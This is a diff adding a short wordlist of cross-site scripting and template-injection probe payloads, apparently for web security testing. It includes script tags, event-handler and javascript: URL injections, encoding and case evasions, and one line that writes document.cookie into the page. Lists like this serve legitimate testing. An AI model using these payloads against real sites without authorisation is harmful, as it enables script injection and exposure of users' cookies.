@@ -1,0 +1,27 @@
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+<svg onload=alert('XSS')>
+<svg/onload=alert(1)>
+"><svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+javascript:alert(1)
+<a href="javascript:alert(1)">click</a>
+<div onmouseover=alert(1)>hover</div>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+{{7*7}}
+${7*7}
+<script>document.write(document.cookie)</script>
+\"><script>alert(String.fromCharCode(88,83,83))</script>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert('XSS')</SCRIPT>
